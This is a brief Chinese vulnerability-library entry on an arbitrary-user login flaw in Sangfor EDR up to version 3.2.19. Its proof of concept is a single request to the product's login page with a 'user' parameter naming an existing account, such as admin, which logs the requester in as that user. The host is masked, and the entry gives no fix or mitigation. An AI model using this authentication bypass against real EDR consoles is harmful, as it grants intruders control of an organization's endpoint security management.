---
title: '深信服EDR任意用户登录漏洞'
date: Fri, 04 Sep 2020 05:13:46 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EDR <=3.2.19

### 漏洞POC

user=任意用户名即可登录（用户名存在）：

```
https://******/ui/login.php?user=admin
```